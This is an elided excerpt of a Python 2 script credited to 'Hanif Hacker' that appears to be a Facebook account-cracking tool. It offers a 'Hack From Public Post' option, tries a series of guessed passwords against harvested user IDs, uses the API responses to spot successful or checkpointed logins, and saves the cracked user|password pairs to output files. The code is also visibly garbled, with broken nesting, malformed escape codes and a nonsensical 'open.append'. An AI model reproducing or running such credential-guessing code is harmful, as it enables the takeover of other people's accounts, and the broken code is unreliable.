...
\033[0;35m[\033[0;92m •• \033[0;35m] Author   : Hanif Hacker
...
def super():
	...
	print "\x1b ║3. Hack From Public Post       ║"
						...
						if 'www.facebook.com' in q["error_msg"]:
							...
							if 'access_token' in q:
								...
								if 'www.facebook.com' in q["error_msg"]:
									...
									print '\x1b[0;91;39[OK] \033[0;39m ' + user  + ' \x1b[0;66;69|\066[0;69m ' + pass3 + '\066[0;69m | \066[0;69m' + b['name']

									oks = open("out/CP.txt", "a")
									...
									if 'access_token' in q:
										...
										if 'www.facebook.com' in q["error_msg"]:
											...
											print '\x1b[0;91;39[OK] \033[0;39m ' + user  + ' \x1b[0;36;39|\033[0;39m ' + pass4 + '\033[0;39m | \033[0;39m' + b['name']
												...
												if 'www.facebook.com' in q["error_msg"]:
													...
													if 'access_token' in q:
														...
														if 'www.facebook.com' in q["error_msg"]:
															...
															print '\x1b[0;91;39[OK] \033[0;39m ' + user  + ' \x1b[0;36;39|\033[0;39m ' + pass6 + '\033[0;39m | \033[0;39m' + b['name']

															oks = open("out/CP.txt", "a")

															oks.write(user+"|"+pass6+"\n")
															...
															if 'access_token' in q:
																...
																if 'www.facebook.com' in q["error_msg"]:
																	...
																	print '\x1b[0;91;39[OK] \033[0;39m ' + user  + ' \x1b[0;36;39|\033[0;39m ' + pass7 + '\033[0;39m | \033[0;39m' + b['name']

																	oks = open("out/CP.txt", "a")

																	oks.write(user+"|"+pass7+"\n")
																	...
																	if 'access_token' in q:
																		...
																		if 'www.facebook.com' in q["error_msg"]:
																			...
																			print '\x1b[0;91;39[OK] \033[0;39m ' + user + '\x1b[0;36;39|\033[0;39m ' + pass8 + '\033[0;39m | \033[0;39m' + b['name']

																			ok = open("out/OK.txt", "a")

																			ok.close()

																			open.append(user+pass8)
